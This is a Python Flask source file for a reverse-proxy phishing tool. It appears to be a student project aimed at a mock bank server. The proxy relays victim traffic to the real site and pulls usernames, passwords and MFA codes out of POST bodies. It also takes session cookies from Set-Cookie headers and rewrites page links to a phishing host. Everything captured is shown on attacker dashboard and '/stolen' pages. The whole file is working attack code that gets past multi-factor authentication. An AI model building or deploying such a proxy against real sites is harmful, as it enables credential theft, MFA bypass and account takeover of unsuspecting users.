from flask import Flask, request, Response, jsonify, render_template
import requests
from datetime import datetime
from urllib.parse import parse_qs




app = Flask(__name__)
REAL_SERVER = "http://378proj-real-bank.com:5000"
stolen_sessions = []
captured_events = []
MAX_EVENTS = 100






def record_event(event_type, ip, path, **details): #**details is kwarg dict to catch extras
    #inserts timestamped event + kwargs into captured_events[0] and cleans up past index MAX_EVENTS

    event = {
        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "type": event_type,
        "ip": ip,
        "path": path,
    }
    event.update(details)               #combine details dict to event dict
    captured_events.insert(0, event)    #most recent event at top of list
    del captured_events[MAX_EVENTS:]    #delete events after list fills up 100+
    return event




@app.route('/dashboard')
def dashboard():
    return render_template('phish_dashboard.html')




@app.route('/api/events')
def api_events():
    latest_credentials = next((e for e in captured_events if e['type'] == 'credentials'), None)
    latest_mfa = next((e for e in captured_events if e['type'] == 'mfa'), None)
    latest_session = next((e for e in captured_events if e['type'] == 'session'), None)
    return jsonify({
        'events': captured_events,
        'total_events': len(captured_events),
        'latest_credentials': latest_credentials,
        'latest_mfa': latest_mfa,
        'latest_session': latest_session,
    })




@app.route('/stolen')
def stolen():
    if not stolen_sessions:
        return "<h2>No stolen sessions captured yet.</h2><p><a href='/dashboard'>Open dashboard</a></p>"


    items = []
    for idx, entry in enumerate(stolen_sessions, start=1):
        items.append(f'''
            <li>
                <strong>Capture #{idx}</strong><br>
                Time: {entry['timestamp']}<br>
                Path: {entry['path']}<br>
                Victim IP: {entry['ip']}<br>
                Session ID: <code>{entry['session_id']}</code>
            </li>
        ''')


    return f"<h2>Captured Sessions</h2><p><a href='/dashboard'>Open dashboard</a></p><ol>{''.join(items)}</ol>"




@app.route('/', defaults={'path': ''}, methods=['GET', 'POST']) #for problems with root page returning error page
@app.route('/<path:path>', methods=['GET', 'POST'])             #this catches every route the victim accesses
def proxy(path):

    #protecting our attacker pages from the victim
    reserved_paths = {'dashboard', 'api/events', 'stolen'}
    if path in reserved_paths:
        return Response('Not found', status=404)


    url = f"{REAL_SERVER}/{path}"
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    client_ip = request.remote_addr                         #pulls the victim's IP address
    display_path = f"/{path}" if path else "/"              #makes sure it doesn't break if victim visits root


    print(f"[{timestamp}] {client_ip} -> {request.method} {display_path}")


    record_event('request', client_ip, display_path, note=f"{request.method} request forwarded")


    if request.method == 'POST':
        raw_body = request.get_data(as_text=True)
        print(f"    Intercepted POST body: {raw_body}")

        #parses query string and returns a dict
        parsed = parse_qs(raw_body)

        if 'user' in parsed or 'pw' in parsed:  #capture victim details
            username = parsed.get('user', [''])[0]
            password = parsed.get('pw', [''])[0]
            record_event('credentials', client_ip, display_path, username=username, password=password)  #store in list
            print(f"    Captured credentials -> user={username} pw={password}")
        if 'code' in parsed:    #capture MFA code details
            code = parsed.get('code', [''])[0]
            record_event('mfa', client_ip, display_path, code=code)
            print(f"    Captured MFA code -> {code}")


    #proxy forwards incoming request to 'url', maintaining same method, body, and cookies but removed 'host' header to prevent leaving traces
    #this is where we impersonate the victim
    resp = requests.request(
        method=request.method,  #match victim request method
        url=url,    #send victim's login request to real server
        data=request.get_data(),    #actual data the victim sent to real server
        headers={k: v for k, v in request.headers if k.lower() != 'host'},  #relays exact same headers except 'host' which is our proxy (we omit this to stay invisible to both ppl)
        cookies=request.cookies,    #send same cookie info to real server (if logged in, stays logged in basically)
        allow_redirects=False,      #this sends the user to the actual site if a redirect is sent from the actual site (we relay the redirect to victim)
        timeout=10,
    )

    #we unpack the response and steal the actual html
    html_content = resp.content.decode('utf-8', errors='ignore')    #errors kept crashing the app
    modified_content = html_content.replace("real-bank.com:5000", "evil-phish.com:5001")    #steal the html of the actual site


    if 'Set-Cookie' in resp.headers:    #bc http sends back headers, including cookie info
        full_cookie = resp.headers['Set-Cookie']
        session_value = full_cookie.split(';')[0]   #turn header into list and extract index 0 (the sesh id)

        #extract session id and make it an object and add into list
        if session_value.startswith('session_id='):
            session_id = session_value.split('=', 1)[1] 
            session_record = {
                'timestamp': timestamp,
                'path': display_path,
                'ip': client_ip,
                'session_id': session_id,
            }
            stolen_sessions.append(session_record)
            record_event('session', client_ip, display_path, session_id=session_id)


    #info in headers sent back by the server can mismatch bc it doesn't know the proxy exists so just exclude them
    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
    headers = [(name, value) for (name, value) in resp.headers.items()
               if name.lower() not in excluded_headers]


    return Response(modified_content.encode('utf-8'), resp.status_code, headers)




if __name__ == '__main__':
    app.run(port=5001, debug=True)



